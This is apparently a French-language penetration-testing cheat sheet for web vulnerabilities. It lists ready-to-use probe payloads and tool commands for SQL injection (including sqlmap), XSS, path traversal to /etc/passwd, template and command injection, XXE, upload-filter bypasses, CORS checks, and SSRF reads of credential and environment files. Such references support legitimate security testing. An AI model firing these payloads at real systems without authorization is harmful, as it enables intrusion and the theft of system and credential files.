Vulnérabilités Web

SQL Injection

▼

Cible : Formulaire de recherche, ID dans l'URL (?id=1), champs de login, Headers (User-Agent, Cookie)

' ou %27 ou " ou ') ou ')) ou '-- - ou %2D%2D%20%2D

Provoquer une erreur de syntaxe ou un bypass de login

' AND 1=1-- - et ' AND 1=2-- -

Vérifier si le contenu de la page change (SQLi aveugle)

' OR SLEEP(5)-- -

Détection par délai (MySQL/MariaDB). Si réponse > 5s -> vulnérable

sqlmap -r request.txt --batch --dbs

Automatisation SQLMap avec requête Burp dans request.txt (mettre * dans request.txt pour la valeur du paramètre à tester : id=10*&name=taco)

sqlmap -r request.txt --batch --risk 3 --level 5 --dbs

Scan agressif si le scan de base ne trouve rien

XSS

▼
  • XSS reflected : script dans URL, cibler la barre de recherche, message d'erreur
  • XSS stored : script en bdd, cibler les commentaires, profil utilisateur
  • XSS dom-based : script via client JS, cibler tout ce qui est après le # dans l'URL, les window.location
    • <h1>XSS</h1>

    Si cela affiche bien un titre c'est vulnérable

    <script>alert('XSS')</script>

    Payload XSS basique

    <img src=x onerror="alert('XSS')">

    Payload XSS basique via image

    Ne pas hésiter à tester plusieurs payloads avec et sans bypass de filtres

    LFI/Directory Traversal

    ▼

    Cible : Les paramètres qui chargent des fichiers ou des pages (?page=, ?file=)

    ..%2F..%2F..%2Fetc%2Fpasswd

    Bypass via URL Encoding (..%2F = ../)

    ..%252f..%252f..%252fetc%252fpasswd

    Double encodage (si le serveur décode deux fois)

    wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh [SIZE] "URL?path=../../../../../../FUZZ"

    Wfuzz : --hh cache les réponses de taille identique à la page d'erreur

    ffuf -u "http://TARGET?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:x:"

    Ffuf : -mr "root:x:" valide l'accès réel au fichier passwd sous Linux

    http://TARGET?file=../../../../etc/passwd

    Test manuel Linux

    http://TARGET?file=../../../../windows/win.ini

    Test manuel Windows

    http://TARGET?file=php://filter/convert.base64-encode/resource=index.php

    Lecture de code source PHP en base64

    SSTI (Template Injection)

    ▼

    Cible : Champs qui reflètent mon texte (ex: "Hello [mon_nom]")

    Action : Ajouter un paramètre, si affiche 49 -> vulnérable

    {{7*7}}
    ${7*7}
    {{7*"7"}}
    #{7*7}
    <%= 7*7 %>
    %7B%7B%207*7%20%7D%7D
    %24%7B7*7%7D

    Command Injection

    ▼

    Cible : Toutes les fonctionnalités où l'app semble intéragir avec le système d'exploitation (un champs de saisie d'IP, un formulaire d'IP, bouton d'export PDF, compression zip)

    ; whoami

    Injection de commande basique (Linux/Windows)

    | id ou `id` ou $(id) ou $$ id

    Injection de commande basique (Linux)

    & ipconfig

    Injection de commande basique (Windows)

    || ping -c 10 127.0.0.1

    Blind command injection avec délais de 10 secondes

    XXE (XML External Entity)

    ▼

    Cible : Partout où du XML est envoyé (API, imports)

    <?xml version="1.0"?> <!DOCTYPE data [ <!ELEMENT data ANY> <!ENTITY test "XXE"> ]> <Contact> <lastName>&test;</lastName> <firstName>Timothée</firstName> </Contact>

    Détection basique : si "XXE" s'affiche dans la réponse.

    IDOR

    ▼

    Cible : Paramètres numériques (?user_id=10)

    Action : Tenter d'accéder aux données d'autrui en changeant l'ID -> (?user_id=1)

    File Upload

    ▼

    Cible : Input d'ajout de fichier

    Action : Bypass d'extension avec .php5, .phtml, .phar, .php.jpg, .php%00.jpg

    Action 2 : Changer application/x-php en image/jpeg dans Burp

    CSRF

    ▼

    Cible : Formulaires/actions sensibles (changer email, mot de passe, supprimer compte)

    Action : Vérifier si les formulaires sensibles (password, email) ont un token unique (CSRF Token), si il y a absence de <input type="hidden" name="csrf_token" ...> dans des formulaires POST c'est sûrement vulnérable

    CORS

    ▼

    Cible: Les en-têtes

    Action : Vérifier si l'API accepte des origines arbitraires

    curl -H "Origin: http://corsfind.com" -I http://TARGET

    Si la réponse contient Access-Control-Allow-Origin: http://corsfind.com -> vulnérable

    SSRF (Server-Side Request Forgery)

    Cible : Partout où le site demande une url (?url=, ?proxy=, ?api=)

    Action : Tenter d'accéder à l'interface localhost ou des ports internes (22, 3306, 8080)

    ?url=http://127.0.0.1/admin
    ?url=file:///etc/passwd
    ?url=file:///etc/hosts
    ?url=file:///app/config.ini
    ?url=file:///var/www/html/config.php
    ?url=file:///etc/apache2/sites-enabled/000-default.conf
    ?url=file:///var/www/html/X_TARGET/settings.py
    ?url=file:///proc/self/environ
    ?url=file:///proc/self/cmdline
    ?url=file:///root/flag.txt
    ?url=file:///C:/windows/win.ini

    JWT

    ▼

    Cible : JWT

    Reconnaissable par ses 3 parties séparées par des points (Header.Payload.Signature) et commençant souvent par eyJ...

    Si le token finit par = ou ==, c'est probablement du Base64. À décoder pour voir le contenu brut.

    Comparer les tokens de deux sessions différentes. Si seule la fin change de façon logique c'est une potentielle IDOR : Session 1: USR-1001 | Session 2: USR-1002

    Format : xxxxx.yyyyy.zzzzz

    Outil d'analyse en ligne : https://jwt.io
